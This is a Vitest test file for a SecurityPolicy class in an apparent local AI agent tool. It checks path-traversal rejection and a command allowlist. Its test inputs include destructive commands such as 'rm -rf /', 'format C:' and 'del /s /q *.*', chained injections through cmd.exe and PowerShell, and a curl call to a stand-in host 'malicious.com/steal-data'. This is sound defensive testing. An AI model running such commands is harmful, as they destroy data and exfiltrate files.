import { describe, expect, it } from "vitest";
import path from "node:path";

import { SecurityPolicy } from "../../src/security/SecurityPolicy.js";

describe("SecurityPolicy", () => {
  const workspaceRoot = path.resolve("G:\\siva\\projects\\private_ai");

  const policy = new SecurityPolicy(workspaceRoot);

  it("allows a file inside the workspace", () => {
    const result = policy.checkPath("package.json", "read");

    expect(result.allowed).toBe(true);
  });

  it("allows nested files inside the workspace", () => {
    const result = policy.checkPath("src/tools/Tool.ts", "read");

    expect(result.allowed).toBe(true);
  });

  it("rejects parent traversal", () => {
    const result = policy.checkPath("..\\outside.txt", "read");

    expect(result.allowed).toBe(false);
  });

  it("rejects deep parent traversal", () => {
    const result = policy.checkPath("..\\..\\..\\outside.txt", "read");

    expect(result.allowed).toBe(false);
  });

  it("rejects an absolute path outside the workspace", () => {
    const outside = path.resolve(workspaceRoot, "..", "outside.txt");

    const result = policy.checkPath(outside, "read");

    expect(result.allowed).toBe(false);
  });

  it("allows the workspace root itself", () => {
    const result = policy.checkPath(workspaceRoot, "read");

    expect(result.allowed).toBe(true);
  });

  it("rejects a sibling directory with a similar name", () => {
    const sibling = `${workspaceRoot}_evil`;

    const result = policy.checkPath(sibling, "read");

    expect(result.allowed).toBe(false);
  });

  it("rejects an empty path that resolves to the workspace root", () => {
    const result = policy.checkPath("", "read");

    expect(result.allowed).toBe(true);
  });

  // Add these inside the describe("SecurityPolicy") block

  describe("checkCommand", () => {
    it("allows npm commands", () => {
      const result = policy.checkCommand("npm install");
      expect(result.allowed).toBe(true);
    });

    it("allows node commands", () => {
      const result = policy.checkCommand("node index.js");
      expect(result.allowed).toBe(true);
    });

    it("allows git commands", () => {
      const result = policy.checkCommand("git status");
      expect(result.allowed).toBe(true);
    });

    it("allows tsc commands", () => {
      const result = policy.checkCommand("tsc --noEmit");
      expect(result.allowed).toBe(true);
    });

    it("blocks del command", () => {
      const result = policy.checkCommand("del /s /q *.*");
      expect(result.allowed).toBe(false);
    });

    it("blocks format command", () => {
      const result = policy.checkCommand("format C:");
      expect(result.allowed).toBe(false);
    });

    it("blocks rm command", () => {
      const result = policy.checkCommand("rm -rf /");
      expect(result.allowed).toBe(false);
    });

    it("blocks shutdown command", () => {
      const result = policy.checkCommand("shutdown /s /t 0");
      expect(result.allowed).toBe(false);
    });

    it("blocks cmd.exe escape attempt", () => {
      const result = policy.checkCommand("npm install && cmd.exe /c del *.*");
      expect(result.allowed).toBe(false);
    });

    it("blocks command chaining with &&", () => {
      const result = policy.checkCommand("npm install && del /s /q *.*");
      expect(result.allowed).toBe(false);
    });

    it("blocks command chaining with semicolon", () => {
      const result = policy.checkCommand("npm install; format C:");
      expect(result.allowed).toBe(false);
    });

    it("blocks pipe operator", () => {
      const result = policy.checkCommand("npm install | rm -rf /");
      expect(result.allowed).toBe(false);
    });

    it("blocks node child_process exec attempt", () => {
      const result = policy.checkCommand(
        "node -e \"require('child_process').exec('del *.*')\"",
      );
      expect(result.allowed).toBe(false);
    });

    it("blocks powershell escape attempt", () => {
      const result = policy.checkCommand(
        "npm install && powershell.exe Remove-Item *",
      );
      expect(result.allowed).toBe(false);
    });

    it("blocks path traversal in command", () => {
      const result = policy.checkCommand("node ../../malicious.js");
      expect(result.allowed).toBe(false);
    });

    it("blocks absolute path in command", () => {
      const result = policy.checkCommand("node C:\\malicious.js");
      expect(result.allowed).toBe(false);
    });

    it("blocks unknown base command", () => {
      const result = policy.checkCommand("python malware.py");
      expect(result.allowed).toBe(false);
    });

    it("blocks curl command", () => {
      const result = policy.checkCommand(
        "curl http://malicious.com/steal-data",
      );
      expect(result.allowed).toBe(false);
    });

    it("blocks git push through run_command", () => {
      const result = policy.checkCommand("git push");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("git_operation tool");
    });

    it("blocks git pull through run_command", () => {
      const result = policy.checkCommand("git pull");
      expect(result.allowed).toBe(false);
    });

    it("blocks git clone through run_command", () => {
      const result = policy.checkCommand(
        "git clone https://github.com/evil/repo",
      );
      expect(result.allowed).toBe(false);
    });

    it("blocks git reset through run_command", () => {
      const result = policy.checkCommand("git reset --hard HEAD");
      expect(result.allowed).toBe(false);
    });

    it("allows git status through run_command", () => {
      const result = policy.checkCommand("git status");
      expect(result.allowed).toBe(true);
    });

    it("allows git log through run_command", () => {
      const result = policy.checkCommand("git log --oneline -5");
      expect(result.allowed).toBe(true);
    });

    it("allows git diff through run_command", () => {
      const result = policy.checkCommand("git diff");
      expect(result.allowed).toBe(true);
    });
  });
});
